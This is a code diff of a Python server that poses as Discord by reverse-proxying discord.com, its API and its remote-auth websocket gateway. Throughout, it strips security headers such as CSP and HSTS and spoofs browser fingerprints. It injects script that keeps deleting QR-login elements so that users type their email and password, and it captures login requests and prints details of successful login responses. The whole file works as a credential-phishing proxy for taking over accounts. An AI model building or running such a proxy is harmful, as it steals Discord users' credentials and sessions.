@@ -1,10 +1,3 @@
-from quart import Quart
-
-if "PROVIDE_AUTOMATIC_OPTIONS" not in Quart.config_class.defaults:
-    Quart.config_class.defaults["PROVIDE_AUTOMATIC_OPTIONS"] = True
-
-app = Quart(__name__)
-
 import base64
 import asyncio
 import ssl as _ssl
@@ -12,32 +5,16 @@ import websockets
 import threading
 from quart import Quart, request, Response, redirect, websocket
 import json
-import base64
-import asyncio
-import ssl as _ssl
-import websockets
-import threading
-
-#!/usr/bin/env python3
-
 import requests
-from quart import Quart, request, Response, redirect, websocket
-import json
-import base64
-import asyncio
-import ssl as _ssl
-import websockets
-import threading
+from hypercorn.asyncio import serve
+from hypercorn.config import Config
 
 app = Quart(__name__)
+if "PROVIDE_AUTOMATIC_OPTIONS" not in app.config:
+    app.config["PROVIDE_AUTOMATIC_OPTIONS"] = True
 
 session = requests.Session()
-adapter = requests.adapters.HTTPAdapter(
-    pool_connections=100,
-    pool_maxsize=100,
-    max_retries=0,
-    pool_block=False
-)
+adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=0, pool_block=False)
 session.mount('http://', adapter)
 session.mount('https://', adapter)
 session.headers.update({
@@ -50,11 +27,7 @@ _fp_lock = threading.Lock()
 _fingerprint = None
 
 def _super_properties():
-    p = {
-        "os": "Windows",
-        "browser": "Chrome",
-        "release_channel": "stable"
-    }
+    p = {"os": "Windows", "browser": "Chrome", "release_channel": "stable"}
     return base64.b64encode(json.dumps(p).encode()).decode()
 
 def _get_fingerprint():
@@ -105,7 +78,6 @@ async def gateway():
             'Access-Control-Allow-Headers': '*',
             'Access-Control-Allow-Methods': '*'
         })
-    
     if 'auth/qr' in request.path:
         headers = {}
         for key, value in request.headers.items():
@@ -124,10 +96,8 @@ async def gateway():
         fp = _get_fingerprint()
         if fp:
             headers['X-Fingerprint'] = fp
-        
         if 'User-Agent' not in headers:
             headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140 Safari/537.36'
-        
         try:
             if request.method == 'POST':
                 raw = await request.get_data()
@@ -150,7 +120,6 @@ async def gateway():
         except Exception as e:
             print(f"QR Auth error: {str(e)}")
             return Response(json.dumps({'error': str(e)}), status=500)
-    
     if 'remote-auth' in request.path:
         if request.method == 'POST':
             headers = {}
@@ -164,7 +133,6 @@ async def gateway():
             fp = _get_fingerprint()
             if fp:
                 headers['X-Fingerprint'] = fp
-            
             try:
                 raw = await request.get_data()
                 resp = await asyncio.to_thread(
@@ -187,10 +155,8 @@ async def gateway():
                 'Content-Type': 'application/json',
                 'Access-Control-Allow-Origin': '*'
             })
-    
     qs = request.query_string.decode('utf-8')
     url = f'wss://gateway.discord.gg/?{qs}' if qs else 'wss://gateway.discord.gg/?v=9&encoding=json'
-    
     return Response(json.dumps({'url': url}), status=200, headers={
         'Content-Type': 'application/json',
         'Access-Control-Allow-Origin': '*'
@@ -202,19 +168,16 @@ async def ws_bridge():
     remote_url = 'wss://remote-auth-gateway.discord.gg/?v=2'
     if qs:
         remote_url = f'wss://remote-auth-gateway.discord.gg/?{qs}'
-
     headers = {
         'Origin': 'https://discord.com',
         'Pragma': 'no-cache',
         'Cache-Control': 'no-cache',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     }
-
     try:
-        requested = websocket.subprotocols  # list[str]
+        requested = websocket.subprotocols
     except Exception:
         requested = []
-
     try:
         if requested:
             await websocket.accept(subprotocol=requested[0])
@@ -222,7 +185,6 @@ async def ws_bridge():
             await websocket.accept()
     except Exception:
         pass
-
     try:
         kw = {"extra_headers": headers}
         if requested:
@@ -237,19 +199,16 @@ async def ws_bridge():
                         await remote.send(data)
                 except Exception:
                     pass
-
             async def remote_to_client():
                 try:
                     async for message in remote:
                         await websocket.send(message)
                 except websockets.ConnectionClosed:
                     pass
-
             done, pending = await asyncio.wait(
                 [asyncio.create_task(client_to_remote()), asyncio.create_task(remote_to_client())],
                 return_when=asyncio.FIRST_COMPLETED,
             )
-
             for task in pending:
                 task.cancel()
     except Exception:
@@ -261,13 +220,10 @@ async def ws_bridge():
 @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'])
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'])
 async def proxy(path=''):
-    if (path in ['gateway', 'gateway/'] or 
-        path.startswith('api/gateway')):
+    if (path in ['gateway', 'gateway/'] or path.startswith('api/gateway')):
         return Response('Route conflict', status=500)
-    
     if not path:
         return redirect('/login')
-    
     if path.startswith('api/'):
         target = f'https://discord.com/api/{path[4:]}'
     elif path.startswith('cdn/'):
@@ -280,21 +236,17 @@ async def proxy(path=''):
         target = f'https://discord.com/{path}'
     else:
         target = f'https://discord.com/{path}'
-    
     if request.query_string:
         target += '?' + request.query_string.decode('utf-8')
-    
     headers = {}
     for key, value in request.headers.items():
         if key.lower() not in ['host', 'content-length', 'connection']:
             headers[key] = value
-
     headers['Host'] = target.split('/')[2]
     headers['Origin'] = 'https://discord.com'
     headers['Referer'] = 'https://discord.com'
     if 'User-Agent' not in headers:
         headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
-    
     try:
         raw = await request.get_data()
         if path.startswith('api/'):
@@ -305,7 +257,6 @@ async def proxy(path=''):
                 fp = _get_fingerprint()
                 if fp:
                     headers['X-Fingerprint'] = fp
-        
         if path == 'api/v9/auth/login' and request.method == 'POST':
             try:
                 login_data = json.loads(raw) if raw else {}
@@ -328,10 +279,8 @@ async def proxy(path=''):
             timeout=1,
             stream=True
         )
-        
         content = resp.content
         content_type = resp.headers.get('Content-Type', '')
-        
         if content and ('text/html' in content_type or 'javascript' in content_type or 'application/json' in content_type or 'text/plain' in content_type):
             try:
                 text = content.decode('utf-8')
@@ -353,64 +302,42 @@ async def proxy(path=''):
                 if 'text/html' in content_type and '</body>' in text:
                     speed_js = '''<script>
 (function(){
-    function killQR(){
-        const qrElements = document.querySelectorAll('[class*="qr" i], [id*="qr" i], [aria-label*="qr" i], [aria-label*="code" i], [class*="verticalSeparator" i], canvas');
-        qrElements.forEach(el => el.remove());
-    }
-    
-    function speedUp(){
-        const style = document.createElement('style');
-        style.textContent = '* { transition: none !important; animation-duration: 0s !important; }';
-        document.head.appendChild(style);
-        
-        const prefetches = ['/api/v9/users/@me', '/api/v9/auth/fingerprint'];
-        prefetches.forEach(url => {
-            const link = document.createElement('link');
-            link.rel = 'prefetch';
-            link.href = url;
-            document.head.appendChild(link);
-        });
-        
-        const emailField = document.querySelector('input[type="email"], input[name="email"]');
-        if (emailField) emailField.focus();
-    }
-    
-    killQR();
-    speedUp();
-    setInterval(killQR, 50);
-    
-    document.addEventListener('DOMContentLoaded', () => {
-        killQR();
-        speedUp();
-    });
+function killQR(){
+const qrElements=document.querySelectorAll('[class*="qr" i],[id*="qr" i],[aria-label*="qr" i],[aria-label*="code" i],[class*="verticalSeparator" i],canvas');
+qrElements.forEach(el=>el.remove());
+}
+function speedUp(){
+const style=document.createElement('style');
+style.textContent='*{transition:none!important;animation-duration:0s!important;}';
+document.head.appendChild(style);
+const prefetches=['/api/v9/users/@me','/api/v9/auth/fingerprint'];
+prefetches.forEach(url=>{const link=document.createElement('link');link.rel='prefetch';link.href=url;document.head.appendChild(link);});
+const emailField=document.querySelector('input[type="email"],input[name="email"]');
+if(emailField)emailField.focus();
+}
+killQR();speedUp();setInterval(killQR,50);
+document.addEventListener('DOMContentLoaded',()=>{killQR();speedUp();});
 })();
 </script>'''
                     text = text.replace('</body>', speed_js + '</body>')
                 content = text.encode('utf-8')
             except Exception:
                 pass
-        
         response_headers = {}
         for key, value in resp.headers.items():
-            if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 
-                                   'content-security-policy', 'x-content-security-policy', 
-                                   'x-webkit-csp', 'strict-transport-security']:
+            if key.lower() not in ['content-encoding','content-length','transfer-encoding','connection','content-security-policy','x-content-security-policy','x-webkit-csp','strict-transport-security']:
                 response_headers[key] = value
-        
         response_headers['Access-Control-Allow-Origin'] = '*'
         response_headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
         response_headers['Access-Control-Allow-Headers'] = '*'
         response_headers['Access-Control-Allow-Credentials'] = 'true'
-        
         response_headers['Cache-Control'] = 'public, max-age=86400'
         response_headers['Connection'] = 'keep-alive'
         response_headers['Keep-Alive'] = 'timeout=300, max=1000'
         response_headers['X-Content-Type-Options'] = 'nosniff'
         response_headers['Vary'] = 'Accept-Encoding'
-        
         if path.startswith('api/'):
             response_headers['Cache-Control'] = 'public, max-age=5'
-        
         if path == 'api/v9/auth/login' and resp.status_code == 200:
             try:
                 response_data = json.loads(resp.text)
@@ -420,38 +347,17 @@ async def proxy(path=''):
                     print("=====================\n")
             except Exception:
                 pass
-        
         return Response(content, status=resp.status_code, headers=response_headers)
-        
     except Exception as e:
         return Response(f"Error: {str(e)}", status=502)
 
 if __name__ == '__main__':
-    import sys
-    use_https = '--https' in sys.argv or '-s' in sys.argv
-
-    from hypercorn.asyncio import serve
-    from hypercorn.config import Config
-
     config = Config()
     config.bind = ["0.0.0.0:5000"]
     config.worker_connections = 3000
     config.keep_alive_timeout = 2
     config.graceful_timeout = 2
     config.timeout_keep_alive = 2
-    config.max_request_size = 16777216  # 16MB
+    config.max_request_size = 16777216
     config.h11_max_incomplete_size = 16384
-
-    if use_https:
-        print("🔒 Starting HTTPS server")
-        print("📍 Go to: https://127.0.0.1:5000/login")
-        print("⚠️  Accept the security warning in your browser (one time)")
-        config.certfile = 'cert.pem'
-        config.keyfile = 'key.pem'
-        config.ciphers = 'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS'
-    else:
-        print("🌐 Starting HTTP server (fast mode)")
-        print("📍 Go to: http://127.0.0.1:5000/login")
-        print("✅ Use email + password login")
-
     asyncio.run(serve(app, config))
